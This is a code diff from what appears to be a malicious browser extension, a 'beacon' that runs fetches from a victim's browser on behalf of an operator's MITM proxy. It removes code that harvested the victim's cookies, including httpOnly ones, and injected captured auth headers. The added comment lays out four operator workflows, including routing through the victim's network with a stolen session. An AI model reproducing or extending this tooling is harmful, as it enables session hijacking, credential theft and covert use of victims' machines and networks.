@@ -34,22 +34,10 @@ function releaseFetchSlot(): void {
   }
 }
 
-// Per-domain spoofing config: domain -> {enabled, headers, userAgent}
-interface SpoofEntry {
-  enabled: boolean;
-  headers: Array<{name: string; value: string}>;
-  userAgent: string;
-}
-let spoofConfig: Record<string, SpoofEntry> = {};
 
 
 export function isProxyActive(): boolean {
   return proxyActive;
-}
-
-export function updateSpoofConfig(config: Record<string, SpoofEntry>): void {
-  spoofConfig = config;
-  console.log("BEX Proxy: Updated spoof config:", Object.keys(spoofConfig));
 }
 
 
@@ -66,7 +54,6 @@ export function startProxy(sessionUUID: string): void {
 
 export function stopProxy(): void {
   proxyActive = false;
-  spoofConfig = {};
   pendingResponses = [];
   fetchQueue = [];
   activeFetches = 0;
@@ -191,8 +178,23 @@ function scheduleReconnect(sessionUUID: string): void {
 
 
 /**
- * Handle an incoming proxy request: execute the fetch from this browser,
- * optionally injecting captured credentials for spoofed domains.
+ * Handle an incoming proxy request: execute the fetch from this browser.
+ *
+ * "Dumb pipe" strategy — the beacon forwards exactly what the MITM proxy
+ * sends and does NOT inject or modify cookies.  This keeps the beacon
+ * composable with four operator workflows:
+ *
+ *  1. Proxy only          — route through victim's network, unauthenticated.
+ *  2. Clone ticket only   — steal session, browse directly (no proxy).
+ *  3. Proxy + clone ticket — route through victim's network WITH stolen
+ *     session.  The Conductor injects cookies/headers/storage/UA into the
+ *     operator's browser; the MITM proxy forwards those headers here.
+ *  4. Proxy + own login   — operator logs in manually; their session cookies
+ *     flow through the MITM proxy naturally.
+ *
+ * Because `credentials` is set to 'omit', the victim's browser cookie jar
+ * is never consulted.  The only Cookie header that reaches the target is the
+ * one the MITM proxy forwarded (if any).
  */
 async function handleProxyRequest(req: {
   id: string;
@@ -203,9 +205,6 @@ async function handleProxyRequest(req: {
 }): Promise<any> {
   try {
     const url = new URL(req.url);
-    const domain = url.hostname;
-    const domainConfig = spoofConfig[domain];
-    const shouldSpoof = domainConfig && domainConfig.enabled;
 
     // Build the headers for the outgoing fetch
     const fetchHeaders: Record<string, string> = {};
@@ -223,31 +222,6 @@ async function handleProxyRequest(req: {
       }
     }
 
-    if (shouldSpoof) {
-      // Inject captured cookies fresh from the browser's cookie jar (includes httpOnly)
-      try {
-        const cookies = await browser.cookies.getAll({ url: req.url });
-        if (cookies.length > 0) {
-          const cookieStr = cookies.map(c => `${c.name}=${c.value}`).join('; ');
-          fetchHeaders['Cookie'] = cookieStr;
-        }
-      } catch (e) {
-        console.error("BEX Proxy: Cookie read failed:", e);
-      }
-
-      // Inject captured Authorization / API headers from spoof config
-      if (domainConfig.headers) {
-        for (const h of domainConfig.headers) {
-          fetchHeaders[h.name] = h.value;
-        }
-      }
-
-      // Inject captured User-Agent
-      if (domainConfig.userAgent) {
-        fetchHeaders['User-Agent'] = domainConfig.userAgent;
-      }
-    }
-
     // Build fetch options with a 30s timeout
     const controller = new AbortController();
     const timeoutId = setTimeout(() => controller.abort(), 30000);
@@ -257,7 +231,7 @@ async function handleProxyRequest(req: {
       headers: fetchHeaders,
       redirect: 'follow', // Follow redirects — 'manual' produces opaque status=0 responses
       signal: controller.signal,
-      credentials: shouldSpoof ? 'include' : 'omit',
+      credentials: 'omit', // Dumb pipe — never inject victim's browser cookies
     };
 
     if (req.body && req.method !== 'GET' && req.method !== 'HEAD') {
